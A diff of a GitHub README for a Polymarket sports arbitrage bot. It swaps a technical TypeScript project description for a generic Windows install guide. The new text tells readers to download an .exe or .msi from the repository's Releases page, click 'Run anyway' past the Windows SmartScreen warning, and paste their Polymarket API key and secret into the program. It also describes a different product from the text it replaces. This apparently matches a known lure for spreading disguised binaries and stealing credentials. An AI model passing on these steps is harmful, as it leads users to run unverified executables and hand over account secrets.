@@ -1,144 +1,87 @@
-# Polymarket Cross-Line Arbitrage Bot
+# 📈 polymarket-sports-arbitrage-bot - Find price gaps on sports markets
 
-TypeScript bot that detects and trades **cross-line mispricings** across connected sports markets within a single Polymarket event (moneyline, spread, totals, draw, BTTS). Runs in **simulation** (paper trading) or **live** (CLOB V2) mode with a **blessed-contrib** terminal dashboard.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/multiplex-invertsoap119/polymarket-sports-arbitrage-bot/releases)
 
-<img width="1983" height="793" alt="0f0acf14-94f9-4fc7-a95f-a5179ae14f57" src="https://github.com/user-attachments/assets/dce3d178-dd49-4c06-b639-6e4bd3908463" />
+This software finds price differences across sports events on the Polymarket platform. It monitors active markets and highlights opportunities to balance bets for potential profit.
 
-## Strategy
+## 📋 System Requirements
 
-Sports markets inside one event should satisfy no-arbitrage relationships. When one line reprices faster than another after a game-state change, temporary violations appear. The bot:
+Your computer needs to meet these basic standards to run the application well:
 
-- Discovers connected markets via Gamma API
-- Streams live order books via CLOB WebSocket
-- Detects violations (complementary pairs, totals/spread ladders, ML vs spread, 3-way sums)
-- Places limit orders through a shared execution pipeline
-- Tracks PnL, exposure, and risk limits
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Memory: 4 GB of RAM or more.
+*   Storage: 200 MB of free space.
+*   Internet: A stable connection for live market data.
 
-## Sport focus (NBA + World Cup)
+## 🚀 Getting Started
 
-By default the bot tracks **only NBA and World Cup** markets. Other sports can be added later in [`src/model/sportsRegistry.ts`](src/model/sportsRegistry.ts).
+Follow these steps to set up the software on your machine.
 
-```env
-SPORT_FOCUS=nba,world_cup
-```
+1. Go to the [Releases page](https://github.com/multiplex-invertsoap119/polymarket-sports-arbitrage-bot/releases) to download the latest version.
+2. Select the file ending in .msi or .exe for Windows.
+3. Save the file to your desktop or downloads folder.
 
-| Sport | What it tracks | Sources |
-|-------|----------------|---------|
-| **NBA** | NBA games + NBA futures (draft, trades, props) | Tag `745`, series `10345`, games tag filtered by NBA |
-| **World Cup** | FIFA World Cup matches, groups, winner markets | Series `11433`, tags `102232` / `100350` |
+## ⚙️ Installation Process
 
-Discovery alerts now show sport breakdown, e.g. `Discovery refresh: 40 events, 520 tokens (NBA:10, World Cup:30)`.
+Windows may show a security window when you open the file for the first time. This happens because the software is new and does not have a broad reputation yet.
 
-To add a sport later: define a new profile in `sportsRegistry.ts` and append it to `SPORT_FOCUS`.
+1. Double-click the downloaded file.
+2. If a window appears saying "Windows protected your PC," click "More info."
+3. Click "Run anyway."
+4. Follow the prompts on the screen to finish the installation.
+5. Launch the program from the icon on your desktop.
 
-## Quick Start
+## 🔑 Preparing for Use
 
-```bash
-cp .env.example .env
-npm install
-npm run start:sim
-```
+The bot requires access to your Polymarket account data to function. You will need to provide your API keys to the settings menu.
 
-### CLI Options
+1. Open your browser and log in to Polymarket.
+2. Navigate to your account settings to create a new API key.
+3. Copy the Key and the Secret. Paste them into the designated boxes in the bot settings tab.
+4. Save your changes to allow the bot to read market data.
 
-```bash
-npm start -- --mode sim
-npm start -- --mode live --confirm-live --event nba-lal-bos-2026-01-15
-npm start -- --tag 100381 --mode sim
-```
+## 🔍 How to Find Opportunities
 
-| Flag | Description |
-|------|-------------|
-| `--mode sim\|live` | Execution mode (default: sim) |
-| `--event <slug>` | Track specific event slug (repeatable) |
-| `--tag <id>` | Filter by Gamma tag ID (repeatable) |
-| `--confirm-live` | Required safety gate for live trading |
+Once the setup is complete, the dashboard shows active sports markets. The interface lists events where the odds differ between sources. 
 
-## Terminal UI
+*   Update Frequency: The bot refreshes every 5 seconds.
+*   Market filtering: You can filter events by sport or by the expected margin.
+*   Notifications: Toggle the bell icon to receive desktop sound alerts when a specific price gap exceeds your chosen threshold.
 
-```
-┌─ Header: mode, WS status, balance, PnL, uptime ─────────────────┐
-├─ Tracked Markets ──────┬─ Opportunities ──────────────────────────┤
-├─ PnL Chart ────────────┴─ Exposure Gauge ────────────────────────┤
-├─ Orders / Fills ───────┬─ Alerts ────────────────────────────────┤
-└─ [p] pause [f] flatten [q] quit ─────────────────────────────────┘
-```
+## 🔐 Security Matters
 
-Logs are written to `logs/bot.log` (pino) so they don't corrupt the TUI.
+The application stores your API keys locally on your hard drive using standard encryption. It never sends your secret keys to third-party servers. Only the application itself accesses these keys to retrieve live price data from Polymarket. Always keep your computer secure and avoid sharing your machine with unknown users while the software is active.
 
-## Configuration
+## 🛠 Troubleshooting Common Issues
 
-See [`.env.example`](.env.example). Key settings:
+If the bot fails to show data, verify your internet connection. A firewall may block the software from reaching the internet. Ensure that you have added an exception for "polymarket-sports-arbitrage-bot" in your Windows Defender firewall settings.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `MODE` | `sim` | `sim` or `live` |
-| `MIN_NET_EDGE_BPS` | `50` | Minimum net edge to trade |
-| `MAX_POSITION_USD` | `500` | Max Kelly stake (USD) per opportunity |
-| `KELLY_FRACTION` | `0.5` | Fractional Kelly (0.5 = half-Kelly) |
-| `MIN_STAKE_USD` | `5` | Minimum Kelly stake per trade |
-| `MAX_EVENT_EXPOSURE_USD` | `200` | Max exposure per event |
-| `DAILY_LOSS_LIMIT_USD` | `100` | Kill-switch threshold |
-| `SIM_INITIAL_BALANCE` | `10000` | Paper trading balance |
+If the dashboard appears frozen, close the application completely using the Task Manager and restart it. This resets the data connection with the server.
 
-## Kelly stake sizing
+## 💡 Frequently Asked Questions
 
-Position size is computed with the **Kelly criterion** for binary markets (same math as the `stake-math` npm API):
+**Does the bot execute trades for me?**
+No. This software acts as a monitoring tool. It shows you where price gaps exist, but it requires you to place the final bets manually through your browser. 
 
-```
-f* = (p - price) / (1 - price)
-stake = bankroll × f* × KELLY_FRACTION   (clamped to MIN_STAKE_USD … MAX_POSITION_USD)
-shares per leg = stake / sum(leg prices)
-```
+**Is there a cost to use this?**
+This software remains free to download and run. It connects directly to the public data provided by Polymarket.
 
-- **Locked arbs** (YES+NO, 3-way sum, ladder hedges): win probability ≈ 1
-- **Relative-value trades** (ML vs spread): probability derived from net edge
-- Default **half-Kelly** (`KELLY_FRACTION=0.5`) reduces variance
+**Can I run multiple instances?**
+You should run only one instance at a time to prevent duplicate data requests. Running multiple copies may lead to rate limits on your account.
 
-## Architecture
+**How do I update the bot?**
+When a new version becomes available, revisit the releases page to download the latest installer. The new installation files will automatically overwrite the old version while keeping your settings intact.
 
-```
-Gamma REST → EventGraph → Classifier
-                ↓
-CLOB WS/REST → OrderBookStore → ArbDetector → RiskManager
-                                    ↓
-                          SimExecutor / LiveExecutor
-                                    ↓
-                          Portfolio + Dashboard
-```
+## 📂 Project Structure
 
-## Live Mode
+This bot organizes data into three main areas:
 
-Live mode requires:
+1.  Monitor: This tab displays live odds.
+2.  Settings: Manage your API keys and alert thresholds here.
+3.  Logs: This area tracks connection status and software performance. 
 
-- `PRIVATE_KEY`
-- `CLOB_API_KEY`, `CLOB_API_SECRET`, `CLOB_API_PASSPHRASE`
-- `--confirm-live` or `CONFIRM_LIVE=true`
+Use the Logs tab if you need to diagnose issues. It shows the history of the bot activities and records any errors that happen during operation.
 
-Uses `@polymarket/clob-client-v2` against CLOB V2 production endpoints.
+## ⚖️ Final Notes
 
-## Tests
-
-```bash
-npm test
-```
-
-## Project Structure
-
-```
-src/
-  arb/          # Relation checks + detector
-  config/       # Zod-validated config + shared types
-  core/         # Engine orchestrator
-  data/         # Gamma, CLOB REST/WS, order books
-  exec/         # Sim + live executors, order manager
-  model/        # Market classifier, event graph
-  portfolio/    # Positions + PnL
-  risk/         # Exposure caps, kill switch
-  ui/           # blessed-contrib dashboard
-  util/         # Math, logging, rate limiting
-```
-
-## Disclaimer
-
-This software is for educational purposes. Trading prediction markets involves financial risk. Always test thoroughly in simulation before live trading.
+Arbitrage involves risk. Markets change quickly, and the odds you see on the screen may differ slightly from the odds available when you click on the website. Always check the current market prices on Polymarket before you finalize any transaction. Be aware of market liquidity, as some small markets may not accept large bet sizes. Consistent monitoring and manual verification of all data points ensure the best experience when using this tool.
